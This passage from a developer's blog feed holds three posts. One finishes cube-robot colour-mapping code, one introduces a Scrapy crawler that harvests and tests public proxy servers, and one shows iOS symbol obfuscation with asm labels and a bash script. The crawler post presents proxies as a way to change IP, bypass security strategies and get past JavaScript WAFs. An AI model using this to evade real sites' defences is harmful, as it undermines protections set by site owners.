</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">colorNodes</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">colorNodes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">color</span> <span class="o">=</span> <span class="n">colors</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">sort</span><span class="p">(</span><span class="n">colorNodes</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">colorNodes</span><span class="p">.</span><span class="n">end</span><span class="p">(),</span> <span class="n">restoreInputSequence</span><span class="p">);</span>
</span><span class='line'>    <span class="n">map</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span> <span class="kt">char</span><span class="o">&gt;</span> <span class="n">colorMap</span><span class="p">;</span>
</span><span class='line'>    <span class="n">colorMap</span><span class="p">[</span><span class="n">colorNodes</span><span class="p">[</span><span class="mi">4</span><span class="p">].</span><span class="n">color</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;U&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">colorMap</span><span class="p">[</span><span class="n">colorNodes</span><span class="p">[</span><span class="mi">13</span><span class="p">].</span><span class="n">color</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;B&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">colorMap</span><span class="p">[</span><span class="n">colorNodes</span><span class="p">[</span><span class="mi">22</span><span class="p">].</span><span class="n">color</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;D&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">colorMap</span><span class="p">[</span><span class="n">colorNodes</span><span class="p">[</span><span class="mi">31</span><span class="p">].</span><span class="n">color</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;F&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">colorMap</span><span class="p">[</span><span class="n">colorNodes</span><span class="p">[</span><span class="mi">40</span><span class="p">].</span><span class="n">color</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;R&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">colorMap</span><span class="p">[</span><span class="n">colorNodes</span><span class="p">[</span><span class="mi">49</span><span class="p">].</span><span class="n">color</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;L&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">int</span> <span class="n">convertTable</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>        <span class="mi">8</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
</span><span class='line'>        <span class="mi">38</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span>
</span><span class='line'>        <span class="mi">35</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span>
</span><span class='line'>        <span class="mi">26</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span>
</span><span class='line'>        <span class="mi">47</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span>
</span><span class='line'>        <span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">char</span> <span class="n">state</span><span class="p">[</span><span class="mi">55</span><span class="p">];</span>
</span><span class='line'>    <span class="n">state</span><span class="p">[</span><span class="mi">54</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;============================</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">colorNodes</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">state</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">colorMap</span><span class="p">[</span><span class="n">colorNodes</span><span class="p">[</span><span class="n">convertTable</span><span class="p">[</span><span class="n">i</span><span class="p">]].</span><span class="n">color</span><span class="p">];</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;color %d: %c %f, %f, %f</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">colorNodes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">color</span><span class="p">,</span> <span class="n">colorNodes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">scalar</span><span class="p">.</span><span class="n">val</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">colorNodes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">scalar</span><span class="p">.</span><span class="n">val</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">colorNodes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">scalar</span><span class="p">.</span><span class="n">val</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="p">[[</span><span class="n">NSString</span> <span class="n">alloc</span><span class="p">]</span><span class="n">initWithCString</span><span class="o">:</span><span class="n">state</span> <span class="n">encoding</span><span class="o">:</span> <span class="n">NSUTF8StringEncoding</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>PS: <code>convertTable</code>是为了将输出的颜色顺序转换为还原算法所需的顺序。</p>

<p>PPS: 输出的颜色是用该颜色所属的面表示的。</p>

<h3>算法部分</h3>

<p>Two-Phase算法，也有pure C的版本，但是这个算法内存占用奇高，且计算出的还原步骤一般都要22步，甚至更多，如果要计算20步以内(<a href="http://www.cube20.org/">上帝之数是20</a>，也就是说任意魔方都可以用不超过20步进行还原)的解法，要花上数分钟的时间。因此我又花了大量的时间寻找性能更好的算法，最终找到两个：</p>

<ul>
<li>optimal Rubik&rsquo;s cube solver，需要80M内存，但实际测试，有大约50%的情况，一直运行，但始终给不出答案(超过5分钟)，不知道是不是算法中存在bug</li>
<li>Dik T. Winter 的算法，内存占用大概只有10M+，计算任意魔方的解法，几乎都可以瞬间给出20步以内的结果</li>
</ul>


<p>很显然，这个没有名字的算法正合我意。经过一番调整和优化，这个算法顺利地在iOS上跑了起来。</p>

<p>将这三部分整合起来，就是文章最开始的那个视频的样子，历经千辛万苦，终于实现了最初设计的那套方案。</p>

<p><img src="http://xelz.info/assets/2017/xuebi.jpg" alt="xuebi" /></p>

<h2>0x05 膜拜一下大神们</h2>

<ol>
<li><p><code>3.25s</code>的世界纪录保持者Cube Stormer 3</p>

<p><iframe width="100%" height="450" src="https://www.youtube.com/embed/X0pFZG7j5cE" frameborder="0" allowfullscreen></iframe></p>

<p>这个是使用Lego NXT的升级版 EV3 拼成的魔方机器人，猜猜用了多少零件？</p></li>
<li><p>国内LEGO大神，动力老男孩做的<a href="http://www.diy-robots.com/?page_id=46">萝卜头</a></p></li>
<li><p>开源魔方机器人，<a href="http://mindcuber.com/index.html">MindCuber</a>，作者正是Cube Stormer 3的作者之一<code>David Gilday</code></p></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Proxy Server Crawler]]></title>
    <link href="http://xelz.info/blog/2017/02/03/proxy-server-crawler/"/>
    <updated>2017-02-03T18:00:00+08:00</updated>
    <id>http://xelz.info/blog/2017/02/03/proxy-server-crawler</id>
    <content type="html"><![CDATA[<p>When we are doing security tests, we always change our IP address to bypass some security strategies. The easiest way to change IP is using a proxy.</p>

<p>Some websites can provide proxy IPs, but none of them can ensure the healthy of those proxy hosts. It&rsquo;s a horrible thing to check them one by one by hand when you wanna got one. So we can crawl these websites and test every proxy IP automatically.</p>

<p>The project is hosted at <a href="https://github.com/xelzmm/proxy_server_crawler">https://github.com/xelzmm/proxy_server_crawler</a>.</p>

<h2>Introduction</h2>

<p><strong>Proxy Server Crawler</strong> is a tool used to crawl public proxy servers from proxy websites. When crawled a proxy server(ip::port::type), it will test the functionality of the server automatically.</p>

<p>Currently supported websites:</p>

<ul>
<li><a href="http://www.66ip.cn">http://www.66ip.cn</a></li>
<li><a href="http://www.cz88.net">http://www.cz88.net</a></li>
<li><a href="http://www.cn-proxy.com">http://www.cn-proxy.com</a></li>
<li><a href="http://www.haodailiip.com">http://www.haodailiip.com</a></li>
<li><a href="http://www.kuaidaili.com">http://www.kuaidaili.com</a></li>
<li><a href="http://www.proxylists.net">http://www.proxylists.net</a></li>
<li><a href="http://www.qiaodm.net">http://www.qiaodm.net</a></li>
<li><a href="http://www.socks-proxy.net">http://www.socks-proxy.net</a></li>
<li><a href="http://www.xroxy.com">http://www.xroxy.com</a></li>
<li><a href="http://www.xicidaili.com">http://www.xicidaili.com</a></li>
</ul>


<p>Currently supported testing(for http proxy)</p>

<ul>
<li>ssl support</li>
<li>post support</li>
<li>speed (tested with 10 frequently used sites)</li>
<li>type(high/anonymous/transparent)</li>
</ul>


<!-- more -->


<h2>Requirements</h2>

<ul>
<li>Python >= 2.7</li>
<li>Scrapy 1.3.0 (not tested for lower version)</li>
<li>node (for some sites, you need node to bypass waf based on javascript)</li>
</ul>


<h2>Usage</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">cd </span>proxy_server_crawler
</span><span class='line'>scrapy crawl chunzhen
</span></code></pre></td></tr></table></div></figure>


<p>[log]</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 59.41.214.218  , port: 3128 , <span class="nb">type</span>: http, proxy server not alive or healthy.
</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 117.90.6.67    , port: 9000 , <span class="nb">type</span>: http, proxy server not alive or healthy.
</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 117.175.183.10 , port: 8123 , speed: 984 , <span class="nb">type</span>: high
</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 180.95.154.221 , port: 80   , <span class="nb">type</span>: http, proxy server not alive or healthy.
</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 110.73.0.206   , port: 8123 , <span class="nb">type</span>: http, proxy server not alive or healthy.
</span><span class='line'><span class="o">[</span>  proxy<span class="o">]</span> ip: 124.88.67.54   , port: 80   , speed: 448 , <span class="nb">type</span>: high       , post: True , ssl: False
</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 117.90.2.149   , port: 9000 , <span class="nb">type</span>: http, proxy server not alive or healthy.
</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 115.212.165.170, port: 9000 , <span class="nb">type</span>: http, proxy server not alive or healthy.
</span><span class='line'><span class="o">[</span>  proxy<span class="o">]</span> ip: 118.123.22.192 , port: 3128 , speed: 769 , <span class="nb">type</span>: high       , post: True , ssl: False
</span><span class='line'><span class="o">[</span>  proxy<span class="o">]</span> ip: 117.175.183.10 , port: 8123 , speed: 908 , <span class="nb">type</span>: high       , post: True , ssl: True
</span></code></pre></td></tr></table></div></figure>


<h2>License</h2>

<p>The MIT License (MIT)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[iOS代码混淆]]></title>
    <link href="http://xelz.info/blog/2016/11/20/ios-code-obfuscation/"/>
    <updated>2016-11-20T20:00:00+00:00</updated>
    <id>http://xelz.info/blog/2016/11/20/ios-code-obfuscation</id>
    <content type="html"><![CDATA[<h3>标识符混淆</h3>

<p>念大婶在博客中介绍了两种方法，用于保护代码逻辑，对抗逆向分析</p>

<ul>
<li><a href="http://blog.csdn.net/yiyaaixuexi/article/details/29201699">代码混淆</a> 通过宏定义，混淆objective-c消息(函数)，用于对抗class-dump。</li>
<li><a href="http://blog.csdn.net/yiyaaixuexi/article/details/29210413">敏感逻辑用C实现</a> 通过static关键字和函数指针的方式，将关键逻辑隐藏，可以对抗class-dump和Cycript攻击。</li>
</ul>


<p>如果用了第二种方式，将函数改用c实现，虽然通过<code>class-dump</code>得不到有价值的信息，但通过<code>nm</code>命令或者<code>IDA/Hopper</code>等工具仍然能从符号表中找到这些c函数以及衍生出的一些静态变量。针对这种情况，我们还是可以通过宏定义的方式，将这些c的标识符(函数名、变量名)替换为随机字符串。</p>

<p>举个例子：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='objective-c'><span class='line'><span class="cp">#define func1 gtBFTcseXSElp</span>
</span><span class='line'><span class="cp">#define func2 yNGYcdrCDEzaqZAQki</span>
</span><span class='line'><span class="cp">#define globalValue uNHUvfrVFRxawXAWlo</span>
</span><span class='line'><span class="kt">int</span> <span class="n">globalValue</span><span class="p">;</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">func1</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">func2</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">func1</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>nm</code>检查符号表，结果如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='objective-c'><span class='line'><span class="mo">0000000000000000</span> <span class="n">T</span> <span class="n">_gtBFTcseXSElp</span>
</span><span class='line'><span class="mo">0000000000000004</span> <span class="n">C</span> <span class="n">_uNHUvfrVFRxawXAWlo</span>
</span><span class='line'><span class="mo">0000000000000010</span> <span class="n">T</span> <span class="n">_yNGYcdrCDEzaqZAQki</span>
</span></code></pre></td></tr></table></div></figure>


<p>说明宏替换对于c的标识符同样有效。但是要一个个手动去define，感觉是要累死的节奏。如果能通过一个脚本，自动从源代码里把所有的标识符声明提取出来，生成一个头文件就好了。可以考虑几种方案：</p>

<ol>
<li>使用正则表达式，根据标识符的声明语法提取</li>
<li>先解析为语法树，再提取标识符节点</li>
<li>给需要混淆的符号打个标记</li>
</ol>


<p>很显然，前两种方案都很繁琐，不好维护。并且如果我要做一个library给第三方使用，必然要暴露一些接口不能被混淆，只有第三种方式可以灵活地选择那些需要混淆哪些不需要，而这种方案实现起来也最简单。最终实现如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//test.c</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#ifdef SYMBOL_OBFUSCATE </span><span class="c1">// 通过外部宏定义控制是否混淆</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &quot;symbols.h&quot;  </span><span class="c1">// 引入生成的混淆头文件</span>
</span><span class='line'><span class="cp">#define SYMBOL(name) asm(name) </span><span class="c1">// 使用asm label语法修改符号名称</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#else </span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define SYMBOL(name)  </span><span class="c1">// 将宏定义为空，即不混淆</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#endif</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// 声明并标记需要混淆的符号</span>
</span><span class='line'><span class="kt">int</span> <span class="n">globalValue</span> <span class="nf">SYMBOL</span><span class="p">(</span><span class="n">_globalValue</span><span class="p">);</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">func1</span><span class="p">()</span> <span class="n">SYMBOL</span><span class="p">(</span><span class="n">_func1</span><span class="p">);</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">func2</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">)</span> <span class="n">SYMBOL</span><span class="p">(</span><span class="n">_func2</span><span class="p">);</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">func3</span><span class="p">();</span>    <span class="c1">// 不混淆</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// 以下不需要做任何处理，保持原样即可</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">func1</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">func2</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">func1</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">func3</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>使用<code>asm label</code>语法的好处是，只需要将符号的声明标记出来进行替换即可， 不需要对该符号的引用进行标记和替换。如果要混淆已经完成的代码，这一点非常省时省力。</p>

<!-- more -->


<p>扫描源代码并生成混淆头文件的脚本:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'><span class="c"># 本脚本用于对源代码中的函数名及全局变量名进行混淆，生成映射文件</span>
</span><span class='line'>
</span><span class='line'><span class="c"># usage: rand a b</span>
</span><span class='line'><span class="c"># 生成[a, b)之间的随机数</span>
</span><span class='line'><span class="k">function </span>rand<span class="o">(){</span>
</span><span class='line'>    <span class="nv">min</span><span class="o">=</span><span class="nv">$1</span>
</span><span class='line'>    <span class="nv">max</span><span class="o">=</span><span class="k">$((</span><span class="nv">$2</span><span class="o">-</span><span class="nv">$min</span><span class="k">))</span>
</span><span class='line'>    <span class="nv">num</span><span class="o">=</span><span class="k">$((</span><span class="nv">$RANDOM</span><span class="o">+</span><span class="m">1000000000</span><span class="k">))</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="k">$((</span><span class="nv">$num</span><span class="o">%</span><span class="nv">$max</span><span class="o">+</span><span class="nv">$min</span><span class="k">))</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 生成随机字符</span>
</span><span class='line'><span class="k">function </span>rand_c<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>    <span class="nv">base</span><span class="o">=</span><span class="s2">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_$&quot;</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="k">${</span><span class="nv">base</span><span class="p">:</span><span class="k">$(</span>rand 0 54<span class="k">)</span><span class="p">:</span><span class="nv">1</span><span class="k">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 生成16-32长度的随机变量名</span>
</span><span class='line'><span class="k">function </span>rand_s<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>    <span class="nv">symbol</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
</span><span class='line'>    <span class="k">for </span>i in <span class="k">$(</span>seq <span class="k">$(</span>rand 16 33<span class="k">))</span><span class="p">;</span> <span class="k">do</span>
</span><span class='line'><span class="k">        </span><span class="nv">symbol</span><span class="o">=</span><span class="nv">$symbol</span><span class="k">$(</span>rand_c<span class="k">)</span>
</span><span class='line'>    <span class="k">done</span>
</span><span class='line'><span class="k">    </span><span class="nb">echo</span> <span class="nv">$symbol</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">file</span><span class="o">=</span><span class="nv">$2</span>
</span><span class='line'><span class="nv">src</span><span class="o">=</span><span class="nv">$1</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 生成文件头，注释</span>
</span><span class='line'>cat &gt; <span class="nv">$file</span> <span class="s">&lt;&lt; EOF</span>
</span><span class='line'><span class="s">//</span>
</span><span class='line'><span class="s">//  $file</span>
</span><span class='line'><span class="s">//</span>
</span><span class='line'>
</span><span class='line'><span class="s">/*</span>
</span><span class='line'><span class="s"> * This is the symbol substitution mapping file.</span>
</span><span class='line'><span class="s"> * Auto-generated by $0, from the source file $src.</span>
</span><span class='line'><span class="s"> * You can change the value of macro defination freely, but DO NOT DELETE any of them.</span>
</span><span class='line'><span class="s"> */</span>
</span><span class='line'>
</span><span class='line'><span class="s">EOF</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 提取源文件中所有的SYMBOL(_xxx)宏，并生成随机标识符</span>
</span><span class='line'>cat <span class="nv">$src</span> <span class="p">|</span> sed -n <span class="s2">&quot;s/.*SYMBOL(\(_.*\)).*/\1/p&quot;</span> <span class="p">|</span> <span class="k">while </span><span class="nb">read </span>symbol
</span><span class='line'><span class="k">do</span>
</span><span class='line'><span class="k">    </span><span class="nv">rand_symbol</span><span class="o">=</span><span class="sb">`</span>rand_s<span class="sb">`</span>
</span><span class='line'>    <span class="nb">echo</span> -e <span class="s2">&quot;\033[32m$symbol\033[m -&gt; \033[33m$rand_symbol\033[m&quot;</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="s2">&quot;#define $symbol \&quot;$rand_symbol\&quot;&quot;</span> &gt;&gt; <span class="nv">$file</span>
</span><span class='line'><span class="k">done</span>
</span><span class='line'>
</span><span class='line'><span class="nb">exit</span>
</span></code></pre></td></tr></table></div></figure>


<p>测试一下效果：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#正常编译并查看符号表</span>
</span><span class='line'><span class="nv">$ </span>clang -c test.c -o test.o <span class="o">&amp;&amp;</span> nm test.o
</span><span class='line'>0000000000000000 T _func1
</span><span class='line'>0000000000000010 T _func2
</span><span class='line'>0000000000000030 T _func3
</span><span class='line'>0000000000000004 C _globalValue
</span><span class='line'>
</span><span class='line'><span class="c">#扫描源代码，生成混淆头文件</span>
</span><span class='line'><span class="nv">$ </span>./obfuscate.sh test.c symbols.h
</span><span class='line'>_globalValue -&gt; vftVFRxswXAWlo<span class="nv">$LOmhu</span>
</span><span class='line'>_func1 -&gt; UvftVFTxsweCSElpqLPmjiMJIb
</span><span class='line'>_func2 -&gt; BGTcseCSEzpqLPQjiM
</span><span class='line'>
</span><span class='line'><span class="c">#查看生成的头文件</span>
</span><span class='line'><span class="nv">$ </span>tail -n 3 symbols.h
</span><span class='line'><span class="c">#define _globalValue &quot;vftVFRxswXAWlo$LOmhu&quot;</span>
</span><span class='line'><span class="c">#define _func1 &quot;UvftVFTxsweCSElpqLPmjiMJIb&quot;</span>
</span><span class='line'><span class="c">#define _func2 &quot;BGTcseCSEzpqLPQjiM&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c">#混淆编译，并查看符号表</span>
</span><span class='line'><span class="nv">$ </span>clang -DSYMBOL_OBFUSCATE -c test.c -o test.o <span class="o">&amp;&amp;</span> nm test.o
</span><span class='line'>0000000000000010 T BGTcseCSEzpqLPQjiM
</span><span class='line'>0000000000000000 T UvftVFTxsweCSElpqLPmjiMJIb
</span><span class='line'>0000000000000030 T _func3
</span><span class='line'>0000000000000004 C vftVFRxswXAWlo<span class="nv">$LOmhu</span>
</span></code></pre></td></tr></table></div></figure>


<p>如果你有点懵，可以看一下混淆的过程是怎样的</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
